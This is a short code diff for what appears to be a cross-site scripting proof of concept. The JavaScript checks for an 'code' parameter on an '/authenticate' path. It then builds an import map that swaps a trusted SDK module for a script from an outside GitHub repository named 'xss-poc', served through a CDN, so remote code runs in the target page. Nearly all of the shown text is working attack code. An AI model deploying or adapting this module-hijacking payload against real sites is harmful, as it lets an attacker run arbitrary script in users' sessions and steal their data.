@@ -1,3 +1,5 @@
+System.import('https://docucdn-a.akamaihd.net/production/1ds/libs/@optimizely/optimizely-sdk/4.9.2/dist/optimizely.browser.umd.min.js')
+
 const searchParams = new URLSearchParams(location.search);
 
 if(searchParams.has('code') && location.path ==='/authenticate') {
@@ -9,7 +11,7 @@ if(searchParams.has('code') && location.path ==='/authenticate') {
     JSON.stringify([
       {
         imports: {
-          "optimizelySdk":"https://cdn.jsdelivr.net/gh/CaTzil/xss-poc@main/docus.js"
+          "optimizelySdk":"https://cdn.jsdelivr.net/gh/CaTzil/xss-poc@main/docux.js"
         },
       },
     ])
